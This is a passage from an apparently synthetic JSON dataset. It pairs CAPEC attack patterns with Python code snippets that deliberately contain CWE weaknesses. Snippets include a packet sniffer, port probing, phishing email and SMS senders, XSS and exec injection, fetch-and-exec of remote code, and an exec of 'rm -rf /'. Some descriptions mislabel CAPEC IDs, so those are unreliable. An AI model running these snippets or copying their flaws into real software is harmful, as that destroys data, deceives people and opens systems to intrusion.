        "code_snippet": "import socket\n\n# Create a raw socket to sniff network traffic\nsniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to the public network interface\nsniffer.bind(('0.0.0.0', 0))\n\n# Include IP headers in the capture\nsniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\nprint('Sniffing network traffic...')\n\ntry:\n    while True:\n        # Receive a packet\n        packet, addr = sniffer.recvfrom(65565)\n        # Print the raw packet data\n        print(packet)\nexcept KeyboardInterrupt:\n    print('Stopping the sniffer')\n    sniffer.close()",
        "description": "This Python code snippet demonstrates a basic network sniffer using raw sockets. The sniffer captures all TCP/IP packets on the network interface and prints the raw packet data. This embodies the main idea of the CAPEC 'Sniffing Network Traffic' by passively monitoring and capturing network traffic. The code does not encrypt the captured data (CWE-311), transmits sensitive information in cleartext (CWE-319), and could potentially expose sensitive system information (CWE-497). The sniffer can be used to observe and analyze network traffic, which could be exploited to capture sensitive information such as passwords or session tokens."
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "import os\nimport ctypes\n\n# CWE-426: Untrusted Search Path\n# CWE-427: Uncontrolled Search Path Element\n# CWE-73: External Control of File Name or Path\n\n# Simulate user input for library path\nuser_supplied_path = input('Enter the path to the library: ')\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\n# Add user-supplied path to the search path\nos.environ['PATH'] = user_supplied_path + os.pathsep + os.environ['PATH']\n\n# Attempt to load a library (e.g., 'example.dll' on Windows or 'libexample.so' on Linux)\ntry:\n    ctypes.CDLL('example')\n    print('Library loaded successfully.')\nexcept OSError as e:\n    print(f'Failed to load library: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability where an application allows user input to control the search path for external libraries. The user-supplied path is prepended to the system's PATH environment variable, which can lead to the application loading a malicious library provided by an attacker. This embodies the CAPEC 'Redirect Access to Libraries' by showing how an adversary can manipulate the execution flow to point to an adversary-supplied library. The code also touches on related CWEs, such as CWE-426 (Untrusted Search Path), CWE-427 (Uncontrolled Search Path Element), and CWE-73 (External Control of File Name or Path), by illustrating how the search path can be influenced by external input, potentially leading to the execution of unauthorized code."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/execute', methods=['POST'])\ndef execute_script():\n    script = request.form['script']\n    # Vulnerable to script injection\n    return render_template_string('<html><body><script>{{ script }}</script></body></html>', script=script)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to script injection attacks. The '/execute' endpoint accepts a POST request containing a 'script' parameter. The script is then directly embedded into an HTML template using Flask's render_template_string function without proper neutralization. This can lead to Cross-Site Scripting (XSS) attacks, where an attacker can inject malicious scripts. The code embodies the main idea of CAPEC-111 (Exploit Script-Based APIs) by allowing user-provided scripts to be executed in the context of the web application. The related CWEs are represented as follows: CWE-79 (Improper Neutralization of Input During Web Page Generation) is demonstrated by the lack of input sanitization, and CWE-81 (Improper Neutralization of Script in an Error Message Web Page) is relevant as the script could be part of an error message. CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine) is also relevant as the template engine is used without proper neutralization of special elements."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "import socket\n\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\ndef vulnerable_client(server_ip, server_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # CWE-941: Incorrectly specified destination (attacker's IP instead of legitimate server)\n        s.connect((server_ip, server_port))\n        \n        # CWE-923: No verification of the server's identity\n        # CWE-924: No integrity check on the message\n        message = \"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\"\n        s.sendall(message.encode('utf-8'))\n        \n        # Receive data from the server\n        response = s.recv(4096)\n        print(response.decode('utf-8'))\n        \n        # CWE-497: Potential exposure of sensitive information\n        sensitive_info = \"User: admin, Password: secret\"\n        s.sendall(sensitive_info.encode('utf-8'))\n        \n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n    finally:\n        s.close()\n\n# Example usage\nvulnerable_client('192.168.1.100', 8080)  # Attacker's IP and port",
        "description": "This Python code snippet demonstrates a vulnerable client that connects to a server. The vulnerabilities are as follows:\n\n1. **CWE-941**: The client connects to an incorrect destination (potentially an attacker's server) instead of the legitimate server.\n2. **CWE-923**: The client does not verify the server's identity, allowing for man-in-the-middle attacks.\n3. **CWE-924**: The client does not check the integrity of the messages sent and received, making it susceptible to tampering.\n4. **CWE-497**: The client sends sensitive information (username and password) without proper protection, exposing it to unauthorized entities.\n\nThis code embodies the main idea of the CAPEC 'Infrastructure Manipulation' by showing how an attacker can manipulate the network infrastructure to intercept and misuse sensitive information."
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/purchase', methods=['GET', 'POST'])\ndef purchase():\n    if request.method == 'POST':\n        # Vulnerable: Trusting client-side hidden field for price\n        item_price = float(request.form['price'])\n        quantity = int(request.form['quantity'])\n        total_cost = item_price * quantity\n        return f'Total cost: ${total_cost}'\n    return render_template_string('''\n        <form method=\"post\">\n            <input type=\"hidden\" name=\"price\" value=\"100.00\">\n            Quantity: <input type=\"text\" name=\"quantity\" value=\"1\">\n            <input type=\"submit\" value=\"Buy\">\n        </form>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a purchase endpoint that processes a form submission. The form includes a hidden field for the item price, which is trusted by the server when calculating the total cost. An attacker can manipulate this hidden field to alter the price, exploiting the server's reliance on client-side data. This embodies the CAPEC 'Manipulating Hidden Fields' and related CWEs, such as CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-472 (External Control of Assumed-Immutable Web Parameter)."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n# Function to send spear phishing email\ndef send_spear_phishing_email(target_email, trusted_sender_email, trusted_sender_password, malicious_url):\n    # Create the email content\n    msg = MIMEMultipart()\n    msg['From'] = trusted_sender_email\n    msg['To'] = target_email\n    msg['Subject'] = 'Important Update from Your Trusted Source'\n\n    # Email body with a malicious link\n    body = f\"Hello,\\n\\nWe have an important update for you. Please visit the following link to review: {malicious_url}\\n\\nBest regards,\\nTrusted Source\"\n    msg.attach(MIMEText(body, 'plain'))\n\n    # Send the email\n    try:\n        server = smtplib.SMTP('smtp.example.com', 587)\n        server.starttls()\n        server.login(trusted_sender_email, trusted_sender_password)\n        text = msg.as_string()\n        server.sendmail(trusted_sender_email, target_email, text)\n        server.quit()\n        print('Spear phishing email sent successfully')\n    except Exception as e:\n        print(f'Failed to send email: {e}')\n\n# Example usage\nsend_spear_phishing_email('target@example.com', 'trusted@example.com', 'password123', 'http://malicious.example.com')",
        "description": "This Python code snippet demonstrates a spear phishing attack by sending a targeted email from a trusted sender's email account. The email contains a malicious URL that the recipient is encouraged to click. The code uses the smtplib library to send the email and MIMEText to format the email content. The trusted sender's email and password are used to authenticate with the SMTP server, making the email appear legitimate. This example embodies the main idea of CAPEC-163 (Spear Phishing) by targeting a specific user with a tailored email that appears to come from a trusted source. The related CWEs are represented by the use of a malicious URL (CWE-601) and the potential for UI misrepresentation (CWE-451)."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-451: UI Misrepresentation of Critical Information\nphishing_message = \"Your account has been compromised. Please visit http://fakebank.com to secure your account.\"\n\n# CWE-290: Authentication Bypass by Spoofing\nspoofed_sender = \"security@realbank.com\"\n\n# CWE-307: Improper Restriction of Excessive Authentication Attempts\n# CWE-309: Use of Password System for Primary Authentication\n# CWE-308: Use of Single-factor Authentication\n\n# Function to send phishing SMS via email-to-SMS gateway\ndef send_phishing_sms(phone_number):\n    msg = MIMEText(phishing_message)\n    msg['From'] = spoofed_sender\n    msg['To'] = f\"{phone_number}@sms.gateway.com\"\n    msg['Subject'] = \"Urgent: Account Security Alert\"\n\n    try:\n        with smtplib.SMTP('smtp.mailserver.com', 587) as server:\n            server.starttls()\n            server.login('phisher@example.com', 'password')\n            server.sendmail(spoofed_sender, [msg['To']], msg.as_string())\n            print(f\"Phishing SMS sent to {phone_number}\")\n    except Exception as e:\n        print(f\"Failed to send phishing SMS: {e}\")\n\n# Example usage\nsend_phishing_sms('1234567890')",
        "description": "This Python code snippet demonstrates a mobile phishing attack by sending a phishing SMS message via an email-to-SMS gateway. The message misrepresents critical information (CWE-451) by spoofing the sender's email address (CWE-290) to appear as a legitimate source. The message contains a link to a fake website designed to capture sensitive information. The code also highlights the use of single-factor authentication (CWE-308) and the potential for brute force attacks due to improper restriction of authentication attempts (CWE-307). The use of a password system for primary authentication (CWE-309) is implied as the target for the phishing attack."
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    # CWE-22: Path Traversal\n    if not file_path.startswith('/safe/directory/'): \n        raise ValueError('Invalid file path')\n\n    # CWE-73: External Control of File Name or Path\n    with open(file_path, 'r') as file:\n        content = file.read()\n\n    # CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n    if file_path.endswith('.txt'):\n        process_text_file(content)\n    elif file_path.endswith('.jpg'):\n        process_image_file(content)\n    else:\n        raise ValueError('Unsupported file type')\n\n    # CWE-377: Insecure Temporary File\n    temp_file_path = '/tmp/tempfile'\n    with open(temp_file_path, 'w') as temp_file:\n        temp_file.write(content)\n\n    # CWE-99: Improper Control of Resource Identifiers\n    os.system(f'cat {temp_file_path}')\n\n\ndef process_text_file(content):\n    print('Processing text file')\n\n\ndef process_image_file(content):\n    print('Processing image file')\n\n# Example usage\nuser_input_path = input('Enter the file path: ')\nprocess_file(user_input_path)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to file manipulation as described in the CAPEC. The `process_file` function takes a file path as input and performs various operations on the file. The code includes the following vulnerabilities:\n\n1. CWE-22 (Path Traversal): The code checks if the file path starts with a safe directory but does not properly neutralize special elements, potentially allowing path traversal attacks.\n2. CWE-73 (External Control of File Name or Path): The file path is controlled by user input, which can lead to unauthorized file access.\n3. CWE-646 (Reliance on File Name or Extension of Externally-Supplied File): The code relies on the file extension to determine how to process the file, which can be exploited by an attacker to misclassify the file.\n4. CWE-377 (Insecure Temporary File): The code creates a temporary file in a predictable location, which can be exploited by an attacker to manipulate the file.\n5. CWE-99 (Improper Control of Resource Identifiers): The code uses the `os.system` function to execute a command with the temporary file path, which can be exploited by an attacker to execute arbitrary commands.\n\nOverall, this code snippet embodies the main idea of the CAPEC by demonstrating how file manipulation can lead to various security vulnerabilities."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "class SystemConfig:\n    def __init__(self):\n        self.config = {'setting1': 'default1', 'setting2': 'default2'}\n        self.authenticated = False\n\n    def reset_config(self):\n        if not self.authenticated:\n            self.config = {'setting1': 'default1', 'setting2': 'default2'}\n            print('Configuration reset to default values.')\n        else:\n            print('Unauthorized reset attempt.')\n\n    def authenticate(self, password):\n        if password == 'correct_password':\n            self.authenticated = True\n            print('Authenticated successfully.')\n        else:\n            print('Authentication failed.')\n\n# Example usage\nsystem = SystemConfig()\nsystem.reset_config()  # Resets configuration without authentication\nsystem.authenticate('wrong_password')\nsystem.reset_config()  # Still resets configuration without proper authentication",
        "description": "This Python code snippet defines a class `SystemConfig` that simulates a system configuration with a reset function. The `reset_config` method resets the configuration to default values without requiring authentication, embodying CWE-306 (Missing Authentication for Critical Function). The `authenticate` method is provided to simulate an authentication mechanism, but it is not used to protect the reset function, demonstrating the vulnerability. This code represents the main idea of CAPEC-272 (Force the System to Reset Values) by allowing an attacker to reset the system configuration to a previous state without proper authentication, potentially exploiting weaknesses in the system's prior state."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "import os\nimport logging\n\n# CWE-1323: Improper Management of Sensitive Trace Data\ntrace_data = 'Sensitive Trace Data'\ntrace_file_path = '/tmp/trace_data.txt'\n\n# Storing sensitive trace data in an unprotected location\nwith open(trace_file_path, 'w') as trace_file:\n    trace_file.write(trace_data)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nlogging.basicConfig(filename='/tmp/system_info.log', level=logging.DEBUG)\nlogging.debug('System Information: CPU Usage: 85%, Memory Usage: 70%')\n\n# CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n# Simulating activation of debug mode\nDEBUG_MODE = True\nif DEBUG_MODE:\n    print('Debug mode activated. Sensitive data may be exposed.')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Simulating a security check that might be optimized away\ndef security_check():\n    pass  # Security check logic here\n\n# Potentially optimized away by the processor\nsecurity_check()\n\n# CWE-506: Embedded Malicious Code\n# Simulating embedded malicious code\nmalicious_code = 'import os; os.system(\"rm -rf /\")'\nexec(malicious_code)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'White Box Reverse Engineering' and associated CWEs. The code includes improper management of sensitive trace data by storing it in an unprotected location (CWE-1323), exposure of sensitive system information through logging (CWE-497), activation of debug logic at runtime (CWE-1313), a security check that might be optimized away by the processor (CWE-1037), and embedded malicious code (CWE-506). These vulnerabilities can be exploited by an attacker to gain insights into the software's structure, function, and composition, potentially leading to further attacks."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "import os\n\n# Create a file with an alternate data stream\nfile_path = 'example.txt'\nads_path = file_path + ':hidden_stream'\n\n# Write data to the main file\nwith open(file_path, 'w') as f:\n    f.write('This is the main file content.')\n\n# Write data to the alternate data stream\nwith open(ads_path, 'w') as f:\n    f.write('This is hidden content in ADS.')\n\n# Read data from the main file\nwith open(file_path, 'r') as f:\n    print('Main file content:', f.read())\n\n# Read data from the alternate data stream\nwith open(ads_path, 'r') as f:\n    print('ADS content:', f.read())",
        "description": "This Python code snippet demonstrates the creation and usage of an NTFS Alternate Data Stream (ADS) on a Windows system. The main file 'example.txt' is created and written with some content. An alternate data stream 'hidden_stream' is then created and written with different content. The code reads and prints the content from both the main file and the ADS. This example embodies the CAPEC concept of using ADS to hide data, which can be exploited by attackers to store malicious tools or sensitive information without detection by standard file utilities. The related CWEs highlight potential weaknesses such as improper handling of ADS, insecure operations, and uncontrolled search paths that could be leveraged in such attacks."
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "import socket\n\n# Function to perform footprinting by probing open ports\ndef footprinting(target_ip):\n    sensitive_ports = [21, 22, 80, 443]  # Common sensitive ports\n    exposed_info = {}\n    for port in sensitive_ports:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((target_ip, port))\n        if result == 0:\n            exposed_info[port] = 'Open'\n        else:\n            exposed_info[port] = 'Closed'\n        sock.close()\n    return exposed_info\n\n# Example usage\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    info = footprinting(target_ip)\n    print(f'Footprinting results for {target_ip}: {info}')",
        "description": "This Python code snippet demonstrates a basic footprinting technique by probing common sensitive ports (21, 22, 80, 443) on a target IP address. The function 'footprinting' attempts to connect to each port and records whether it is open or closed. This information is then returned as a dictionary. The code embodies the CAPEC concept of footprinting by engaging in probing activities to identify properties of the target. It also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing which ports are open, CWE-205 (Observable Behavioral Discrepancy) by revealing differences in port states, and CWE-207 (Observable Behavioral Discrepancy With Equivalent Products) by behaving differently based on the target's configuration."
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "import requests\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nurl = 'http://example.com/login?username=admin&password=secret'\nresponse = requests.get(url)\n\n# CWE-209: Generation of Error Message Containing Sensitive Information\nif response.status_code != 200:\n    print(f'Error: {response.status_code} - {response.text}')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nserver_info = response.headers.get('Server')\nprint(f'Server Information: {server_info}')\n\n# CWE-1125: Excessive Attack Surface\n# Simulating multiple probes to identify the web application\nendpoints = ['/admin', '/login', '/register', '/api/data']\nfor endpoint in endpoints:\n    probe_response = requests.get(f'http://example.com{endpoint}')\n    print(f'Probing {endpoint}: {probe_response.status_code}')",
        "description": "This Python code snippet demonstrates web application fingerprinting by sending a series of probes to a web application to gather information. It uses the GET request method with sensitive query strings (CWE-598) to simulate a login attempt. If an error occurs, it prints the error message, potentially exposing sensitive information (CWE-209). The code also retrieves and prints server information from the response headers (CWE-497). Finally, it probes multiple endpoints to identify the web application's structure, representing an excessive attack surface (CWE-1125). This information can help an attacker formulate a targeted attack plan."
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "user_input = input('Enter variable name: ')\n\n# CWE-627: Dynamic Variable Evaluation\nexec(f'{user_input} = 42')\n\n# CWE-95: Eval Injection\nexec(f'print({user_input})')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-77: Manipulating User-Controlled Variables. The code takes user input to dynamically create and manipulate a variable name using the 'exec' function. This is an example of CWE-627 (Dynamic Variable Evaluation) and CWE-95 (Eval Injection). The 'exec' function is used to evaluate the user input as code, which can lead to arbitrary code execution if the input is not properly sanitized. This represents the main idea of the CAPEC by showing how user-controlled variables can be manipulated to execute unintended actions."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    # CWE-451: UI Misrepresentation of Critical Information\n    # The user thinks they are submitting a harmless form, but it actually triggers a download\n    if 'download' in request.form:\n        return 'Downloading file...'\n    return 'Form submitted'\n\n@app.route('/')\ndef index():\n    # CWE-290: Authentication Bypass by Spoofing\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # CWE-925: Improper Verification of Intent by Broadcast Receiver\n    # CWE-618: Exposed Unsafe ActiveX Method\n    # The form action is spoofed to trick the user into downloading a file\n    form_html = '''\n    <form method=\"POST\" action=\"/submit\">\n        <input type=\"hidden\" name=\"download\" value=\"true\">\n        <button type=\"submit\">Submit Query</button>\n    </form>\n    '''\n    return render_template_string(form_html)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates the concept of Action Spoofing. The main idea is to trick the user into performing an unintended action. In this case, the user believes they are submitting a harmless form, but the form is designed to trigger a file download instead. This is achieved by embedding a hidden input field in the form that sets the 'download' parameter. The server-side code checks for this parameter and responds with a message indicating a file download. This example also touches on related CWEs by showing how critical information can be misrepresented in the UI (CWE-451), how authentication can be bypassed (CWE-290), and how communication channels can be incorrectly specified (CWE-941). Additionally, it hints at improper verification of intent (CWE-925) and unsafe methods (CWE-618) by demonstrating how a seemingly safe action can be manipulated to perform a dangerous one."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/flash', methods=['GET'])\ndef flash_injection():\n    # CWE-434: Unrestricted Upload of File with Dangerous Type\n    flash_file = request.args.get('flash_file')\n    if not flash_file.endswith('.swf'):\n        return 'Invalid file type', 400\n\n    # CWE-88: Improper Neutralization of Argument Delimiters in a Command\n    # CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n    flash_params = request.args.get('params')\n    template = f\"<embed src='{flash_file}' flashvars='{flash_params}' />\"\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has an endpoint '/flash' that accepts user input to embed a Flash file within an HTML document. The code is vulnerable to Flash Parameter Injection (CAPEC-137) due to improper data validation and neutralization. Specifically, it allows unrestricted upload of files (CWE-434) and does not properly neutralize special elements in the template engine (CWE-1336). Additionally, it fails to properly delimit arguments (CWE-88), which can lead to injection attacks. The 'flash_file' parameter is not adequately validated, and the 'params' parameter is directly inserted into the HTML template without proper sanitization, making the application susceptible to malicious input."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "import requests\n\ndef fetch_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to retrieve code')\n\n# Example usage\nfetch_and_execute('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a vulnerable pattern where code is fetched from a remote location and executed without proper validation or sanitization. The 'fetch_and_execute' function takes a URL as input, retrieves the content from the URL using the 'requests' library, and then executes the retrieved content using the 'exec' function. This embodies the main idea of the CAPEC 'Code Inclusion' by showing how an adversary could exploit this weakness to force arbitrary code to be retrieved and executed. The related CWEs are represented as follows: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) is shown by fetching code from an external URL, CWE-506 (Embedded Malicious Code) is implied by the potential for the fetched code to be malicious, CWE-94 (Improper Control of Generation of Code) is demonstrated by the use of 'exec' on untrusted input, CWE-98 (PHP Remote File Inclusion) is conceptually similar but in Python, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) is shown by the lack of restrictions on the executed code."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "import os\n\n# Vulnerable configuration file path\nconfig_file_path = '/etc/myapp/config.ini'\n\n# Function to read configuration\ndef read_config(file_path):\n    with open(file_path, 'r') as file:\n        return file.read()\n\n# Function to write configuration\ndef write_config(file_path, data):\n    with open(file_path, 'w') as file:\n        file.write(data)\n\n# Simulate an attacker modifying the configuration file\nattacker_data = '[Settings]\\nDebugMode=True\\n'\nwrite_config(config_file_path, attacker_data)\n\n# Application reads the modified configuration\nconfig_data = read_config(config_file_path)\nprint('Configuration Loaded:', config_data)\n\n# Application behavior changes based on the modified configuration\nif 'DebugMode=True' in config_data:\n    print('Debug mode enabled, sensitive operations exposed!')",
        "description": "This Python code snippet demonstrates a configuration/environment manipulation attack. The code simulates an attacker modifying an external configuration file used by an application. The `write_config` function is used to inject malicious settings into the configuration file, such as enabling a debug mode. When the application reads the modified configuration using the `read_config` function, it changes its behavior based on the manipulated settings, potentially exposing sensitive operations. This example embodies the main idea of CAPEC-15 and related CWEs by showing how external control of system or configuration settings can lead to security vulnerabilities."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "import os\n\n# Simulate a protected directory and file\nprotected_dir = '/protected'\nprotected_file = 'config.cfg'\n\n# Simulate an attacker creating a file with the same name in a different directory\nattacker_dir = '/tmp'\nattacker_file_path = os.path.join(attacker_dir, protected_file)\n\n# Create the attacker's file\nwith open(attacker_file_path, 'w') as f:\n    f.write('malicious content')\n\n# Vulnerable function that loads the configuration file\n# It searches the attacker's directory before the protected directory\nsearch_paths = [attacker_dir, protected_dir]\n\nfor path in search_paths:\n    file_path = os.path.join(path, protected_file)\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            config_content = f.read()\n        break\n\nprint(f'Loaded config content: {config_content}')",
        "description": "This Python code snippet demonstrates a vulnerability where an attacker can create a file with the same name as a protected file in a different directory. The vulnerable function searches directories in a specific order and loads the first file it finds with the specified name. In this case, the attacker's file in '/tmp' is loaded before the legitimate file in '/protected'. This represents the CAPEC idea of exploiting file location algorithms by creating files with the same name as protected files. The related CWEs provide additional context, such as reliance on file names and paths, and the potential for external control over these elements."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "from flask import Flask, request, redirect, make_response\n\napp = Flask(__name__)\n\n@app.route('/redirect')\ndef open_redirect():\n    target_url = request.args.get('url')\n    if target_url:\n        return redirect(target_url)\n    return 'No URL provided', 400\n\n@app.route('/flash')\ndef flash_vulnerability():\n    flash_url = request.args.get('flash_url')\n    if flash_url:\n        response = make_response(f'<object type=\"application/x-shockwave-flash\" data=\"{flash_url}\"></object>')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No Flash URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to demonstrate vulnerabilities related to Cross-Site Flashing (CAPEC-). The '/redirect' route represents an Open Redirect (CWE-601) where user input is directly used to redirect the user to an external URL without validation. The '/flash' route demonstrates how an attacker can exploit Flash functionality by injecting a user-controlled URL into an object tag, leading to potential Cross-Site Scripting (CWE-79) and other vulnerabilities. The code highlights the risks of accepting and using untrusted user input directly in web applications."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "from flask import Flask, request, jsonify, make_response\nimport json\n\napp = Flask(__name__)\n\n# Simulated micro-service endpoint\n@app.route('/api/userinfo', methods=['GET'])\ndef user_info():\n    # CWE-598: Using GET request with sensitive query strings\n    user_id = request.args.get('user_id')\n    if not user_id:\n        return make_response(jsonify({'error': 'User ID is required'}), 400)\n\n    # Simulated sensitive data\n    user_data = {\n        '1': {'name': 'John Doe', 'email': 'john.doe@example.com'},\n        '2': {'name': 'Jane Smith', 'email': 'jane.smith@example.com'}\n    }\n\n    # CWE-219: Storing sensitive data under web root\n    if user_id in user_data:\n        return jsonify(user_data[user_id])\n    else:\n        return make_response(jsonify({'error': 'User not found'}), 404)\n\n# CWE-539: Using persistent cookies with sensitive information\n@app.route('/login', methods=['POST'])\ndef login():\n    data = request.get_json()\n    username = data.get('username')\n    password = data.get('password')\n\n    if username == 'admin' and password == 'password':\n        resp = make_response(jsonify({'message': 'Login successful'}))\n        resp.set_cookie('session_id', '123456789', max_age=60*60*24*30)  # Persistent cookie\n        return resp\n    else:\n        return make_response(jsonify({'error': 'Invalid credentials'}), 401)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask framework to create a simple web application with two endpoints: '/api/userinfo' and '/login'. The '/api/userinfo' endpoint demonstrates CWE-598 by using a GET request with a sensitive query string to retrieve user information. It also illustrates CWE-219 by potentially exposing sensitive user data under the web root. The '/login' endpoint demonstrates CWE-539 by setting a persistent cookie containing sensitive session information upon successful login. This code embodies the main idea of the CAPEC by exposing micro-services directly, making them vulnerable to exploitation through the identified CWEs."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Sensitive file with incorrect permissions\nsensitive_file = '/etc/sensitive_data.txt'\nos.chmod(sensitive_file, 0o777)  # Incorrectly setting permissions to be world-readable and writable\n\n# CWE-1220: Insufficient Granularity of Access Control\n# Function to check access control, but with insufficient granularity\nuser_roles = {'admin': ['read', 'write', 'execute'], 'user': ['read']}\n\ndef check_access(user_role, action):\n    if action in user_roles.get(user_role, []):\n        return True\n    return False\n\n# CWE-1280: Access Control Check Implemented After Asset is Accessed\n# Function to read sensitive data with access control check after access\n\ndef read_sensitive_data(user_role):\n    data = None\n    try:\n        with open(sensitive_file, 'r') as file:\n            data = file.read()  # Accessing the file before checking access control\n    except IOError:\n        return 'Error reading file'\n    if not check_access(user_role, 'read'):\n        return 'Access Denied'\n    return data\n\n# Example usage\nuser_role = 'user'\nprint(read_sensitive_data(user_role))",
        "description": "This Python code snippet demonstrates a scenario where access control is incorrectly configured, leading to potential security vulnerabilities. The code sets overly permissive permissions on a sensitive file (CWE-732), implements an access control check with insufficient granularity (CWE-1220), and performs the access control check after the sensitive data has already been accessed (CWE-1280). This combination of issues can allow unauthorized users to read sensitive data, exemplifying the main idea of the CAPEC: exploiting incorrectly configured access control security levels."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    if file.filename.endswith('.swf'):\n        file.save(f'/path/to/uploads/{file.filename}')\n        return 'File uploaded successfully'\n    return 'Invalid file type'\n\n@app.route('/')\ndef index():\n    return render_template_string('''\n    <html>\n    <body>\n        <form action=\"/upload\" method=\"post\" enctype=\"multipart/form-data\">\n            <input type=\"file\" name=\"file\">\n            <input type=\"submit\" value=\"Upload\">\n        </form>\n        <iframe src=\"/path/to/uploads/overlay.swf\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;\"></iframe>\n    </body>\n    </html>\n    ''')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that demonstrates a Flash File Overlay attack. The '/upload' route allows users to upload files, and if the file is a Flash file (with a .swf extension), it saves the file to a specified directory. The main page (index route) contains an HTML form for file uploads and an iframe that loads a Flash file with a transparent overlay. This iframe is positioned to cover the entire page, capturing user interactions and potentially performing malicious actions. This example embodies the CAPEC's main idea of using a transparent Flash overlay to intercept user actions. The code also touches on related CWEs, such as improper restriction of rendered UI layers (CWE-1021) and unrestricted upload of dangerous file types (CWE-434)."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
